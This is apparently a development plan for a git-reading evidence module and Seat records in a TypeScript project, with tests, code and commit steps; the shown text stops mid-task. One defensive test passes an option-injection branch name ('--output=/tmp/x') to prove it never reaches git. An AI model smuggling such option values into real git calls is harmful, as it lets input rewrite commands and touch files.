A fact is bound to the commit it was true at, and it goes stale when its branch moves. This task reads both from git: a checkout's revision (its commit, its branch, whether it holds changes not committed), a branch's tip, how a fact bound to one commit stands now — fresh, some commits behind, rewritten, on uncommitted changes, final, or unknown with why — a branch's diff against the base it came from, and the project a folder belongs to. Read-only, through `execFile`, with `GIT_OPTIONAL_LOCKS=0` so a background read never holds the index lock a commit wants.

`final` is the one exception to *a fact goes stale when its branch moves*, and it is modelled rather than assumed: a merged pull request whose branch is gone — deleted after the merge, in a checkout that is still a repository — is the last word on that branch, because nothing can land on it any more. Nothing else is ever final. A merged pull request whose branch is still there is judged like any fact: commits after the merge leave it behind, and a rewrite moves it; and one whose checkout is gone is unknown.

**Files:**
- Create: `packages/server/src/evidence/revision.ts`
- Create: `packages/server/test/fixtures/evidence-desk.ts` (a repository helper; Task 4 adds the desk)
- Test: `packages/server/test/evidence-revision.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `isSha` (Task 2); `isRevisionName` (`packages/server/src/git-revision.ts`); `repositoryRoot` (`packages/server/src/worktree.ts`).
- Produces: `interface Revision { head: Sha; branch: string | null; dirty: boolean }`; `revisionOf(cwd): Promise<Revision | null>`; `tipOf(cwd, branch: string | null): Promise<Sha | null>`; `canonical(path): Promise<string>`; `projectOf(folder): Promise<string>`; `freshnessOf(checkout: { cwd; branch }, at: Sha, options?: { dirty?: boolean; project?: string; merged?: boolean }): Promise<Freshness>`; `baseOf(cwd): Promise<string | null>`; `diffOf(cwd): Promise<{ files; added; removed; from; to } | null>`. In `@harnessdesk/protocol`: `type Freshness` (`fresh`, `behind`, `moved`, `uncommitted`, `final`, `unknown`). In the test fixture: `interface Repo { dir: string; git(...args: string[]): Promise<string> }`, `makeRepo(prefix?): Promise<Repo>`.

- [ ] **Step 1: The fixture's repository**

Create `packages/server/test/fixtures/evidence-desk.ts`:

```ts
import { execFile } from 'node:child_process'
import { writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { promisify } from 'node:util'

import { tempDir } from '../scratch.js'

/**
 * What the evidence plane's tests stand on: a git repository made the way a
 * person would make one, as Jane Doe. Task 4 adds a desk beside it.
 */

const run = promisify(execFile)

export interface Repo {
  readonly dir: string
  /** git, in the repository, as Jane Doe. */
  git(...args: string[]): Promise<string>
}

/** A repository on `main` with one commit. */
export const makeRepo = async (prefix = 'hd-evidence-repo-'): Promise<Repo> => {
  const dir = tempDir(prefix)
  const git = async (...args: string[]): Promise<string> =>
    (await run('git', ['-C', dir, '-c', 'user.email=dev@example.com', '-c', 'user.name=Jane Doe', ...args])).stdout.trim()
  await git('init', '-q', '-b', 'main')
  await writeFile(join(dir, 'README.md'), 'hello\n')
  await git('add', '.')
  await git('commit', '-q', '-m', 'first')
  return { dir, git }
}
```

- [ ] **Step 2: Write the failing tests**

Create `packages/server/test/evidence-revision.test.ts`:

```ts
import assert from 'node:assert/strict'
import { execFile } from 'node:child_process'
import { mkdir, rm, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'
import { promisify } from 'node:util'

import { diffOf, freshnessOf, projectOf, revisionOf, tipOf } from '../src/evidence/revision.js'
import { makeRepo } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * What a fact is bound to, and how it stands later: the commit it was true
 * at, and how many commits its branch has taken since — or why nobody can say.
 */

const run = promisify(execFile)

test('a revision is the commit, the branch, and whether the tree holds changes not committed', async () => {
  const { dir, git } = await makeRepo()
  const head = await git('rev-parse', 'HEAD')
  assert.deepEqual(await revisionOf(dir), { head, branch: 'main', dirty: false })
  await writeFile(join(dir, 'new.txt'), 'x\n')
  assert.deepEqual(await revisionOf(dir), { head, branch: 'main', dirty: true })
  await git('checkout', '-q', '--detach')
  assert.equal((await revisionOf(dir))?.branch, null)
  // No commit to bind anything to: outside a repository, or before its first commit.
  assert.equal(await revisionOf(tempDir('hd-evidence-plain-')), null)
  const empty = tempDir('hd-evidence-empty-')
  await run('git', ['-C', empty, 'init', '-q'])
  assert.equal(await revisionOf(empty), null)
})

test('a fact is fresh at its branch tip, behind by the commits since, and moved when rewritten', async () => {
  const { dir, git } = await makeRepo()
  const at = await git('rev-parse', 'HEAD')
  const checkout = { cwd: dir, branch: 'main' }
  assert.deepEqual(await freshnessOf(checkout, at), { state: 'fresh' })
  for (const n of [2, 3]) {
    await writeFile(join(dir, 'README.md'), `${n}\n`)
    await git('commit', '-q', '-am', `change ${n}`)
  }
  assert.deepEqual(await freshnessOf(checkout, at), { state: 'behind', commits: 2 })
  // An amend rewrites history under the fact: it is no longer on the branch.
  const later = await git('rev-parse', 'HEAD')
  await git('commit', '-q', '--amend', '-m', 'changed again')
  assert.deepEqual(await freshnessOf(checkout, later), { state: 'moved' })
})

test('a fact that ran on uncommitted changes is stale whatever the branch does', async () => {
  const { dir, git } = await makeRepo()
  const at = await git('rev-parse', 'HEAD')
  assert.deepEqual(await freshnessOf({ cwd: dir, branch: 'main' }, at, { dirty: true }), { state: 'uncommitted' })
})

test('unknown says why: the checkout is gone, the branch is gone, or it left the project', async () => {
  const { dir, git } = await makeRepo()
  const at = await git('rev-parse', 'HEAD')
  await git('checkout', '-q', '-b', 'work')
  await git('branch', '-q', '-D', 'main')
  assert.deepEqual(await freshnessOf({ cwd: dir, branch: 'main' }, at), {
    state: 'unknown',
    why: 'the branch main is gone',
  })
  assert.deepEqual(await freshnessOf({ cwd: dir, branch: 'work' }, at, { project: '/somewhere/else' }), {
    state: 'unknown',
    why: 'its checkout is no longer part of this project',
  })
  assert.deepEqual(await freshnessOf({ cwd: dir, branch: 'work' }, at, { project: await projectOf(dir) }), { state: 'fresh' })
  await rm(dir, { recursive: true, force: true })
  assert.deepEqual(await freshnessOf({ cwd: dir, branch: 'work' }, at), { state: 'unknown', why: 'its checkout is gone' })
})

test('a merged pull request is final only when its branch is gone; commits after the merge still leave it behind', async () => {
  const { dir, git } = await makeRepo()
  await git('checkout', '-q', '-b', 'work')
  await writeFile(join(dir, 'README.md'), 'work\n')
  await git('commit', '-q', '-am', 'the work')
  const head = await git('rev-parse', 'HEAD')
  const checkout = { cwd: dir, branch: 'work' }
  // Merged, and its branch still here and where it was: fresh, like any fact.
  assert.deepEqual(await freshnessOf(checkout, head, { merged: true }), { state: 'fresh' })
  // A commit on the branch after the merge is work the pull request never carried.
  await writeFile(join(dir, 'README.md'), 'after\n')
  await git('commit', '-q', '-am', 'after the merge')
  assert.deepEqual(await freshnessOf(checkout, head, { merged: true }), { state: 'behind', commits: 1 })
  // Its branch deleted after the merge: nothing can land on it now, so it stands as it is.
  await git('checkout', '-q', 'main')
  await git('branch', '-q', '-D', 'work')
  assert.deepEqual(await freshnessOf(checkout, head, { merged: true }), { state: 'final' })
  // Only a merged pull request is ever final: any other fact on a gone branch is unknown.
  assert.deepEqual(await freshnessOf(checkout, head), { state: 'unknown', why: 'the branch work is gone' })
  // And a detached checkout has no branch to be gone.
  assert.deepEqual(await freshnessOf({ cwd: dir, branch: null }, head, { merged: true }), { state: 'moved' })
})

test('a branch name that could be read as an option never reaches git', async () => {
  const { dir } = await makeRepo()
  assert.equal(await tipOf(dir, '--output=/tmp/x'), null)
  assert.equal(await tipOf(dir, 'a..b'), null)
})

test("a branch's diff is its committed work against the base it came from", async () => {
  const { dir, git } = await makeRepo()
  await git('checkout', '-q', '-b', 'feature')
  await writeFile(join(dir, 'README.md'), 'hello\ntwo\nthree\n')
  await mkdir(join(dir, 'src'))
  await writeFile(join(dir, 'src', 'b.txt'), 'b\n')
  await git('add', '.')
  await git('commit', '-q', '-m', 'work')
  const from = await git('merge-base', 'main', 'HEAD')
  const to = await git('rev-parse', 'HEAD')
  assert.deepEqual(await diffOf(dir), { files: 2, added: 3, removed: 0, from, to })
  // Uncommitted edits are not the branch's work.
  await writeFile(join(dir, 'README.md'), 'changed\n')
  assert.deepEqual(await diffOf(dir), { files: 2, added: 3, removed: 0, from, to })
})
```

- [ ] **Step 3: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Cannot find module '../src/evidence/revision.js'`.

- [ ] **Step 4: Freshness, in the protocol**

Append to `packages/protocol/src/evidence.ts`:

```ts
// ----------------------------------------------------------- what is drawn

/**
 * How a fact stands against where its branch is now.
 *
 * Only a current fact is a verdict: `fresh`, or `final` — which only a merged
 * pull request whose branch is gone can be. `behind`, `moved` and
 * `uncommitted` are stale — drawn, never silently green — and `unknown` is not
 * zero: it says why the desk cannot tell. A fact a backup brought is `unknown`
 * until this desk observes the same question itself.
 */
export type Freshness =
  | { readonly state: 'fresh' }
  /** Its revision is on the branch, and this many commits have landed since. */
  | { readonly state: 'behind'; readonly commits: number }
  /** Its revision is no longer on the branch: rewritten by an amend or a rebase. */
  | { readonly state: 'moved' }
  /** It ran on changes that were never committed. */
  | { readonly state: 'uncommitted' }
  /**
   * The last word on a branch that is gone: a pull request that was merged, and
   * its branch deleted after. Nothing can land on it now, so it stands as it is.
   * Only a merged pull request is ever final.
   */
  | { readonly state: 'final' }
  | { readonly state: 'unknown'; readonly why: string }
```

- [ ] **Step 5: What git says**

Create `packages/server/src/evidence/revision.ts`:

```ts
import { execFile } from 'node:child_process'
import { realpath, stat } from 'node:fs/promises'
import { resolve } from 'node:path'
import { promisify } from 'node:util'

import type { Freshness, Sha } from '@harnessdesk/protocol'

import { isRevisionName } from '../git-revision.js'
import { repositoryRoot } from '../worktree.js'
import { isSha } from './records.js'

/**
 * What git says about a checkout, for evidence: which commit a fact is bound
 * to, and how far its branch has moved since.
 *
 * Read-only, and read the way a background reader should: through `execFile`,
 * never a shell, and with `GIT_OPTIONAL_LOCKS=0`, so a status taken while an
 * agent is committing never holds the index lock the commit wants.
 */

const run = promisify(execFile)

const git = async (cwd: string, args: readonly string[]): Promise<string> => {
  const { stdout } = await run('git', ['-C', cwd, ...args], {
    timeout: 20_000,
    maxBuffer: 8 * 1024 * 1024,
    env: { ...process.env, GIT_OPTIONAL_LOCKS: '0' },
  })
  return stdout
}

/** A command's answer, or null when git refused — not a repository, no such ref. */
const gitOr = async (cwd: string, args: readonly string[]): Promise<string | null> => {
  try {
    return await git(cwd, args)
  } catch {
    return null
  }
}

/** Where a checkout is: its commit, the branch it is on, and whether it holds changes not committed. */
export interface Revision {
  readonly head: Sha
  readonly branch: string | null
  readonly dirty: boolean
}

/** Null outside a repository, or in one with no commit yet: there is no revision to bind a fact to. */
export const revisionOf = async (cwd: string): Promise<Revision | null> => {
  const head = (await gitOr(cwd, ['rev-parse', '--verify', '--quiet', 'HEAD^{commit}']))?.trim() ?? ''
  if (!isSha(head)) return null
  const branch = (await gitOr(cwd, ['symbolic-ref', '--quiet', '--short', 'HEAD']))?.trim() || null
  const status = await gitOr(cwd, ['status', '--porcelain=v1', '--untracked-files=normal'])
  return { head, branch, dirty: status === null || status.trim() !== '' }
}

/**
 * Where a fact's branch is now in its checkout — or HEAD, for a fact observed
 * on a detached HEAD. Null when the branch is gone, or the folder is not a
 * repository any more. A branch name read back from a record is checked before
 * git sees it.
 */
export const tipOf = async (cwd: string, branch: string | null): Promise<Sha | null> => {
  if (branch !== null && !isRevisionName(branch)) return null
  const ref = branch === null ? 'HEAD^{commit}' : `refs/heads/${branch}^{commit}`
  const tip = (await gitOr(cwd, ['rev-parse', '--verify', '--quiet', ref]))?.trim() ?? ''
  return isSha(tip) ? tip : null
}

/** A path as the filesystem resolves it, or as written when it is not there. */
export const canonical = async (path: string): Promise<string> => {
  try {
    return await realpath(path)
  } catch {
    return resolve(path)
  }
}

/**
 * The project a folder belongs to: its repository's main checkout, or the
 * folder itself when it is in no repository. The key a store is kept under.
 */
export const projectOf = async (folder: string): Promise<string> =>
  (await repositoryRoot(folder)) ?? (await canonical(folder))

/**
 * How a fact bound to `at` stands now, against its branch in its checkout.
 *
 * `dirty` is the fact's own: a check that ran on changes never committed is
 * about no commit at all, so it is stale however the branch moves. A checkout
 * that has gone, a branch that has gone, or a folder that is no longer a
 * checkout of the fact's project is `unknown` — and says which, because unknown
 * is not zero.
 *
 * `merged` is for the one fact that can be the last word on its branch: a
 * pull request that was merged. When its branch is gone — deleted after the
 * merge, as a forge usually does — nothing can land on it any more, and the
 * fact is `final` rather than unknown. Every other way it can stand is the same
 * as any fact's: commits after the merge leave it behind, and a rewrite moves it.
 */
export const freshnessOf = async (
  checkout: { readonly cwd: string; readonly branch: string | null },
  at: Sha,
  options: { readonly dirty?: boolean; readonly project?: string; readonly merged?: boolean } = {},
): Promise<Freshness> => {
  const there = await stat(checkout.cwd).then((info) => info.isDirectory(), () => false)
  if (!there) return { state: 'unknown', why: 'its checkout is gone' }
  if (options.project !== undefined && (await projectOf(checkout.cwd)) !== options.project) {
    return { state: 'unknown', why: 'its checkout is no longer part of this project' }
  }
  if (options.dirty) return { state: 'uncommitted' }
  const tip = await tipOf(checkout.cwd, checkout.branch)
  if (tip === null) {
    if (options.merged && checkout.branch !== null && (await revisionOf(checkout.cwd)) !== null) return { state: 'final' }
    return { state: 'unknown', why: checkout.branch === null ? 'it is not a repository any more' : `the branch ${checkout.branch} is gone` }
  }
  if (tip === at) return { state: 'fresh' }
  const ancestor = await gitOr(checkout.cwd, ['merge-base', '--is-ancestor', at, tip])
  if (ancestor === null) return { state: 'moved' }
  const count = Number((await gitOr(checkout.cwd, ['rev-list', '--count', `${at}..${tip}`]))?.trim())
  return Number.isInteger(count) && count > 0 ? { state: 'behind', commits: count } : { state: 'moved' }
}

/**
 * The branch a checkout's work is measured from: the remote's default branch
 * when the repository names one, else a local `main` or `master`. Null when
 * there is none of them — then there is nothing to measure a diff from.
 */
export const baseOf = async (cwd: string): Promise<string | null> => {
  const remote = (await gitOr(cwd, ['symbolic-ref', '--quiet', 'refs/remotes/origin/HEAD']))?.trim()
  if (remote && isRevisionName(remote)) return remote
  for (const name of ['main', 'master']) {
    if (await gitOr(cwd, ['rev-parse', '--verify', '--quiet', `refs/heads/${name}^{commit}`])) return `refs/heads/${name}`
  }
  return null
}

/** What a checkout's branch changes against its base, committed work only: the `diff` fact. */
export const diffOf = async (
  cwd: string,
): Promise<{ readonly files: number; readonly added: number; readonly removed: number; readonly from: Sha; readonly to: Sha } | null> => {
  const revision = await revisionOf(cwd)
  const base = await baseOf(cwd)
  if (!revision || !base) return null
  const from = (await gitOr(cwd, ['merge-base', base, revision.head]))?.trim() ?? ''
  if (!isSha(from)) return null
  const shortstat = (await gitOr(cwd, ['diff', '--shortstat', from, revision.head])) ?? ''
  const number = (pattern: RegExp): number => Number(pattern.exec(shortstat)?.[1] ?? 0)
  return {
    files: number(/(\d+) files? changed/),
    added: number(/(\d+) insertions?\(\+\)/),
    removed: number(/(\d+) deletions?\(-\)/),
    from,
    to: revision.head,
  }
}
```

- [ ] **Step 6: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-revision.test.js`
Expected: PASS — 7 tests.

- [ ] **Step 7: Prove the tests can fail**

1. In `freshnessOf`, delete `if (options.dirty) return { state: 'uncommitted' }`: `a fact that ran on uncommitted changes is stale whatever the branch does` fails. Restore it.
2. In `tipOf`, delete `if (branch !== null && !isRevisionName(branch)) return null`: `a branch name that could be read as an option never reaches git` fails — `--output=/tmp/x` reaches `rev-parse`, which answers with a revision. Restore it.
3. In `freshnessOf`, add `if (options.merged) return { state: 'final' }` before the `dirty` line — a merged pull request exempt from freshness: `a merged pull request is final only when its branch is gone; commits after the merge still leave it behind` fails on `behind`. Restore it.

- [ ] **Step 8: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/protocol/src/evidence.ts packages/server/src/evidence/revision.ts packages/server/test/fixtures/evidence-desk.ts packages/server/test/evidence-revision.test.ts
git commit -m "feat(evidence): what git says about a checkout, and how a fact stands now

A fact is bound to a commit and read against its branch later: fresh at the
tip, some commits behind, rewritten since, run on changes never committed, or
unknown with why — and final, only for a merged pull request whose branch is
gone. Read through execFile with optional locks off, and a branch name from a
record is checked before git sees it.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 4: A Seat record for every seat an Agent takes

`agent/seat` keeps a seat in memory today (`SessionRecord.seatedAs`) and nowhere else. This task writes its durable Seat record — before the seat is kept, and awaited, so the desk never answers with a Seat that is not on disk — and gives the host the one object every later task hangs off: `EvidencePlane`, held by the host, reached by methods as `ctx.evidence`. A seat whose record cannot be written is closed, as one whose brief could not be handed over is. A conversation's latest Seat record is readable on the wire, read-only.

The record says what the seat's standing order said it may do in today's words — `standing: { kind: 'permission', permission }`, the permission the seat holds — and phase 3 writes `{ kind: 'ceiling', level }` here for an Agent that says only `ceiling:` (Task 1's seam). The Seat book also knows, from the start, a Seat a backup brought (`restored`, Task 14): it is indexed and drawn, a Seat this desk kept always comes first for a conversation, only a kept Seat says which Agent a conversation is (`latestKeptOf`), and the desk never closes a restored one.

**Files:**
- Create: `packages/server/src/evidence/seats.ts`, `packages/server/src/evidence/plane.ts`, `packages/server/src/methods/evidence.ts`
- Modify: `packages/server/src/methods/index.ts` (register the domain), `packages/server/src/methods/context.ts` (`HostContext.evidence`), `packages/server/src/host.ts` (hold, expose and close the plane)
- Modify: `packages/server/src/methods/agents.ts` (`'agent/seat'` writes the record)
- Modify: `packages/protocol/src/wire.ts`, `packages/protocol/src/wire-validators.ts` (`evidence/seat`)
- Modify: `script/check-reachable.mjs` (pin `evidence/seat`)
- Modify: `packages/server/test/fixtures/evidence-desk.ts` (the desk, an Agent, a wait)
- Test: `packages/server/test/evidence-seats.test.ts` (new); `packages/server/test/agent-seat.test.ts` (its `rig`, named below)

**Proof needs:** neither

**Interfaces:**
- Consumes: `EvidenceStore`, `foldSeats`, `mintId`, `SeatOpening` (Task 2); `projectOf`, `revisionOf` (Task 3); `SeatedAs` with `ceiling` (Task 1).
- Produces:
  - `type SeatOpeningInput = Omit<SeatOpening, 'id' | 'checkout' | 'openedAt'> & { readonly cwd: string }`; `class SeatBook { constructor(store: EvidenceStore, now?: () => number); load(): Promise<void>; opened(input: SeatOpeningInput): Promise<SeatRecord>; settled(): Promise<void>; closed(runtime: string, sessionId: string, why: string): Promise<SeatRecord[]>; of(runtime, sessionId): SeatRecord[]; latestOf(runtime, sessionId): SeatRecord | null; latestKeptOf(runtime, sessionId): SeatRecord | null; byId(id: SeatId): SeatRecord | null }` — `latestOf` prefers a Seat this desk kept to one a backup brought; `latestKeptOf` answers only a kept one; `closed` closes only kept ones.
  - `interface EvidencePort { board(room: string): TeamState | null; cwdOf(runtime: string, sessionId: string): string | null; push(notification: WireNotification): void; log(message: string, details?): void }`; `interface EvidenceOptions { dir: string; now?: () => number }`; `class EvidencePlane { constructor(options: EvidenceOptions, port: EvidencePort); readonly store: EvidenceStore; readonly seats: SeatBook; load(): Promise<void>; close(): Promise<void> }`.
  - `HostContext.evidence: EvidencePlane`.
  - Wire: `'evidence/seat': { params: { runtime: string; sessionId: string }; result: SeatRecord | null }`.
  - Test fixture: `evidenceDesk(t, options?, at?): Promise<EvidenceDesk>` (`{ host, runtime, stateDir, repo, stop }`), `writeAgent(stateDir, id?, name?): Promise<string>`, `until(read, what, ms?)`.

- [ ] **Step 1: Confirm the anchors phase 2 left**

Run: `grep -n "new MachineSeatingFile(join(this.#state.directory, SEATING_FILE), {" packages/server/src/host.ts && grep -n "seating: this.#machineSeating," packages/server/src/host.ts && grep -n "return ctx.seats.recordAgent(opened.runtime, opened.sessionId, seated)" packages/server/src/methods/agents.ts`
Expected: one match each — the seating file's constructor as phase 2's Task 10 left it (with its `log`), the context's `seating` line, and Task 1's `recordAgent` call.

- [ ] **Step 2: The desk the tests stand on**

In `packages/server/test/fixtures/evidence-desk.ts`, replace its imports with:

```ts
import { execFile } from 'node:child_process'
import { mkdir, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import type { TestContext } from 'node:test'
import { promisify } from 'node:util'

import { Host, StateStore, type HostOptions } from '../../src/index.js'
import { tempDir } from '../scratch.js'
import { FakeRuntime } from './fake-runtime.js'
import { silent } from './harness.js'
```

and append:

```ts

export interface EvidenceDesk {
  readonly host: Host
  readonly runtime: FakeRuntime
  readonly stateDir: string
  readonly repo: Repo
  /** Disposes the host, once — for a test that starts a second host on this one's state. */
  stop(): Promise<void>
}

/**
 * A started host reached through `host.call` — no socket, so nothing here needs
 * a loopback listener — with the fake runtime registered and a repository open
 * as its project. On its own state directory, or on `at`: a halted host's, for
 * what survives a restart. `host.call` is below the wire's validation; a test of
 * what the wire admits uses `parseClientMessage` beside it.
 */
export const evidenceDesk = async (
  t: TestContext,
  options: Partial<HostOptions> = {},
  at?: { readonly stateDir: string; readonly repo: Repo },
): Promise<EvidenceDesk> => {
  const stateDir = at?.stateDir ?? tempDir('hd-evidence-state-')
  const repo = at?.repo ?? (await makeRepo())
  const runtime = new FakeRuntime()
  const host = new Host({
    logger: silent,
    state: new StateStore(join(stateDir, 'state.json')),
    builtinAgents: tempDir('hd-evidence-builtins-'),
    catalogRefreshMs: 0,
    ...options,
  })
  host.register(runtime)
  await host.start()
  // Dispose is terminal and throws the second time, so a test that stops a host early is not stopped again.
  let stopped = false
  const stop = async (): Promise<void> => {
    if (stopped) return
    stopped = true
    await host.dispose()
  }
  t.after(stop)
  await host.call('workspace/open', { path: repo.dir })
  return { host, runtime, stateDir, repo, stop }
}

/** One of this machine's Agents, seated on the fake runtime. Answers its file's text. */
export const writeAgent = async (stateDir: string, id = 'scout', name = 'Scout'): Promise<string> => {
  const source = `---\nname: ${name}\npermission: read\nprefer: [fake]\n---\nLook around, and say what you saw.\n`
  await mkdir(join(stateDir, 'agents', id), { recursive: true })
  await writeFile(join(stateDir, 'agents', id, 'AGENT.md'), source, 'utf8')
  return source
}

/** Waits for something the host does after it answers, and says what was awaited when it does not come. */
export const until = async <T>(read: () => Promise<T | null> | T | null, what: string, ms = 5_000): Promise<T> => {
  const deadline = Date.now() + ms
  for (;;) {
    const value = await read()
    if (value !== null) return value
    if (Date.now() > deadline) throw new Error(`waited ${ms}ms for ${what}`)
    await new Promise((resolve) => setTimeout(resolve, 20))
  }
}
```

- [ ] **Step 3: Write the failing tests**

1. Create `packages/server/test/evidence-seats.test.ts`:

```ts
import assert from 'node:assert/strict'
import { readFile, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'

import { digestOf } from '@harnessdesk/agent-inventory'
import {
  parseClientMessage,
  runtimeId,
  sessionId,
  ValidationError,
  type SeatRecord,
  type Session,
} from '@harnessdesk/protocol'

import { canonical } from '../src/evidence/revision.js'
import { SeatBook } from '../src/evidence/seats.js'
import { EvidenceStore } from '../src/evidence/store.js'
import { evidenceDesk, makeRepo, writeAgent } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * The Seat record: written when a seat is kept, before the desk answers, and
 * immutable after — a closing is a second record, never an edit of the first.
 */

test('a kept seat is recorded with the checkout it works in, read from git, and closed once', async () => {
  const repo = await makeRepo()
  const store = new EvidenceStore(tempDir('hd-evidence-seats-'))
  const book = new SeatBook(store, () => 100)
  const record = await book.opened({
    agent: { id: 'scout', name: 'Scout', origin: 'user' },
    briefDigest: 'digest-1',
    seat: { runtime: 'fake', model: 'fake-1' },
    seatLabel: 'Fake Runtime · Fake One',
    passedOver: [],
    standing: { kind: 'permission', permission: 'read' },
    ceiling: null,
    cwd: repo.dir,
    session: { runtime: 'fake', sessionId: 's1' },
    board: null,
    role: null,
  })
  const project = await canonical(repo.dir)
  assert.deepEqual(record.checkout, { cwd: repo.dir, project, branch: 'main', head: await repo.git('rev-parse', 'HEAD') })
  assert.equal(record.openedAt, 100)
  assert.equal(record.closed, null)
  assert.deepEqual(book.latestOf('fake', 's1'), record)

  const closed = await book.closed('fake', 's1', 'deleted')
  assert.deepEqual(closed.map((seat) => seat.closed), [{ at: 100, why: 'deleted' }])
  assert.deepEqual(await book.closed('fake', 's1', 'deleted'), [], 'a closed seat is not closed again')

  // On disk: the opening as written, and one closing beside it — never an edit of the opening.
  const lines = (await readFile(join(store.folderOf(project), 'seats.ndjson'), 'utf8')).trim().split('\n').map((line) => JSON.parse(line))
  assert.deepEqual(lines.map((line) => line.type), ['seat', 'seat-closed'])
  assert.equal(lines[0].record.ceiling, null)
  assert.equal('closed' in lines[0].record, false)
})

test("a seat phase 3 keeps for an Agent that says only `ceiling:` is recorded in that order's words, and read back", async () => {
  const repo = await makeRepo()
  const dir = tempDir('hd-evidence-seats-')
  const book = new SeatBook(new EvidenceStore(dir), () => 100)
  const record = await book.opened({
    agent: { id: 'scout', name: 'Scout', origin: 'user' },
    briefDigest: 'digest-1',
    seat: { runtime: 'fake' },
    seatLabel: 'Fake Runtime',
    passedOver: [],
    standing: { kind: 'ceiling', level: 'edit' },
    ceiling: { level: 'edit', hold: 'asked' },
    cwd: repo.dir,
    session: { runtime: 'fake', sessionId: 's1' },
    board: null,
    role: null,
  })
  // A later desk reads it back as it was written: no `permission:` was invented for it.
  const later = new SeatBook(new EvidenceStore(dir))
  await later.load()
  assert.deepEqual(later.latestOf('fake', 's1'), record)
  assert.deepEqual(later.latestOf('fake', 's1')?.standing, { kind: 'ceiling', level: 'edit' })
})

test('a Seat a backup brought is history: a kept Seat comes first, and the desk never closes a restored one', async () => {
  const dir = tempDir('hd-evidence-seats-')
  const store = new EvidenceStore(dir)
  const opening = (id: string, openedAt: number, restored: { at: number } | null) => ({
    type: 'seat' as const,
    record: {
      id,
      agent: { id: 'scout', name: 'Scout', origin: 'user' as const },
      briefDigest: 'digest-1',
      seat: { runtime: 'fake' },
      seatLabel: 'Fake Runtime',
      passedOver: [],
      standing: { kind: 'permission' as const, permission: 'read' as const },
      ceiling: null,
      checkout: { cwd: '/work/repo', project: '/work/repo', branch: 'main', head: null },
      session: { runtime: 'fake', sessionId: 's1' },
      board: null,
      role: null,
      openedAt,
      ...(restored ? { restored } : {}),
    },
  })
  // The restored one says it was opened later; the one this desk kept still answers for the conversation.
  await store.append('/work/repo', 'seats', [opening('kept', 1, null), opening('from-backup', 50, { at: 60 })])
  const book = new SeatBook(store, () => 100)
  await book.load()
  assert.equal(book.latestOf('fake', 's1')?.id, 'kept')
  assert.equal(book.latestKeptOf('fake', 's1')?.id, 'kept')

  const closed = await book.closed('fake', 's1', 'deleted')
  assert.deepEqual(closed.map((seat) => seat.id), ['kept'], 'only the Seat this desk kept is closed')
  assert.equal(book.byId('from-backup')?.closed, null)

  // A conversation only a backup knows is drawn from it, and is no Agent this desk seated.
  await store.append('/work/repo', 'seats', [{ ...opening('only-restored', 5, { at: 60 }), record: { ...opening('only-restored', 5, { at: 60 }).record, session: { runtime: 'fake', sessionId: 's2' } } }])
  await book.load()
  assert.equal(book.latestOf('fake', 's2')?.id, 'only-restored')
  assert.equal(book.latestKeptOf('fake', 's2'), null)
})

test('through the host: an Agent seated leaves its Seat record before the call answers, and the wire reads it', async (t) => {
  const { host, stateDir, repo } = await evidenceDesk(t)
  const source = await writeAgent(stateDir)
  const session = (await host.call('agent/seat', { id: 'scout', cwd: repo.dir })) as Session

  const record = (await host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) })) as SeatRecord
  assert.deepEqual(record.agent, { id: 'scout', name: 'Scout', origin: 'user' })
  assert.equal(record.briefDigest, digestOf(source))
  assert.deepEqual(record.seat, { runtime: 'fake' })
  assert.equal(record.seatLabel, session.settings?.seatLabel)
  assert.deepEqual(record.standing, { kind: 'permission', permission: 'read' })
  assert.equal(record.ceiling, null, 'null until phase 3 fills it')
  assert.deepEqual(record.session, { runtime: 'fake', sessionId: String(session.id) })
  assert.equal(record.checkout.branch, 'main')
  assert.equal(record.board, null)
  assert.equal(record.closed, null)
  // On disk already: the call did not answer before the record was written.
  const folder = new EvidenceStore(join(stateDir, 'evidence')).folderOf(await canonical(repo.dir))
  assert.match(await readFile(join(folder, 'seats.ndjson'), 'utf8'), new RegExp(record.id))
  // A conversation never seated has no record, and says so as null.
  assert.equal(await host.call('evidence/seat', { runtime: 'fake', sessionId: 'nobody' }), null)
})

test('through the host: a seat whose record cannot be written is closed, and the refusal says why', async (t) => {
  const { host, runtime, stateDir, repo } = await evidenceDesk(t)
  await writeAgent(stateDir)
  // A file where the store's folder has to be: nothing under it can be written.
  await writeFile(join(stateDir, 'evidence'), 'not a folder')
  await assert.rejects(
    host.call('agent/seat', { id: 'scout', cwd: repo.dir }),
    /^Error: Scout was seated on .+, and its Seat record could not be written, so the conversation was closed: /,
  )
  const opened = [...runtime.sessions.keys()]
  assert.equal(opened.length, 1)
  const held = host.registry.get(runtimeId('fake'), sessionId(String(opened[0])))
  assert.equal(held?.live ?? null, null, 'its handle is let go')
  assert.equal(held?.seatedAs ?? null, null, 'and it was never kept as the Agent')
})

test('the wire refuses a Seat record asked of no conversation', () => {
  const ask = (params: unknown) => parseClientMessage({ id: 1, method: 'evidence/seat', params })
  assert.throws(() => ask({ runtime: '', sessionId: 's1' }), ValidationError)
  assert.throws(() => ask({ runtime: 'fake', sessionId: ' ' }), ValidationError)
  assert.throws(() => ask({ runtime: 'fake' }), ValidationError)
  assert.deepEqual(ask({ runtime: 'fake', sessionId: 's1' }).params, { runtime: 'fake', sessionId: 's1' })
})
```

2. In `packages/server/test/agent-seat.test.ts`, the shared `rig` builds a hand-made `HostContext` for `'agent/seat'`, which now reaches `ctx.evidence`. This is a named change to a shared helper's shape: it gains a stand-in plane that keeps what it was asked to record, returned as `durable`.
   - Add `import type { SeatOpeningInput } from '../src/evidence/seats.js'` beside its `import type { SeatedAs } from '../src/registry.js'`.
   - After `const recorded: SeatedAs[] = []`, add:

```ts
